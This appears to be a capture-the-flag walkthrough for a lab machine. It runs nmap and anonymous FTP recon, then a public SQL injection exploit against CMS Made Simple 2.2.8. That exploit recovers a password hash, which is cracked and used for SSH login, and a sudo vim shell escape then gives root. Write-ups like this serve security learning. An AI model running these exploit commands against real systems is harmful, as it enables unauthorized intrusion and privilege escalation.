# Recon
## Nmap

21/tcp   open   ftp
80/tcp   closed http
2222/tcp open   EtherNetIP-1

21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.1.16
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)


## FTP

- To solve the error: 229 Entering Extended Passive Mode (|||43424|) just enter the word: passive
- We enter with anonymous and got a file called formitch.txt
- 

## Web

- Looking at robots.txt it seems like it is disallowing a endpoint called: /openemr-5_0_1_3

```
Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```

- Searching for vulnerabilities: searchsploit openemr, we only got vulnerabilities that need to be authenticated
- Since we cant access the openemr we are stucked

## Gobuster

Lets do a gobuster enumeration.
```
/simple               (Status: 301) [Size: 313] [--> http://10.10.111.75/simple/]
```
We found a website using "CMS made simple" that it seems like is in the version 2.2.8 
Lets start to find vulnerabilites for this version.

```
searchsploit cms made simple 2.2.8

--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                         | php/webapps/46635.py
--------------------------------------------------------------------------------- ---------------------------------

```
We found a sql injection explopit for this version.
Lets copy to our directory and make some changes to run with python3: searchsploit -m 46635 


```
python3 46635.py -u http://10.10.111.75/simple/ -w ~/tools/seclists/Passwords/Leaked-Databases/rockyou-10.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

Using https://www.dcode.fr/hash-function we get:
1dac0d92e9fa6bb2secret

With the password being secret

## SSH

With those credentials we login in ssh as mitch and we get the user.txt


## Priv Escal

```
mitch@Machine:~$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

With that being said we can just do:


```
mitch@Machine:~$ sudo vim -c ':!/bin/sh'

# whoami
root
```

And we got the root flag.




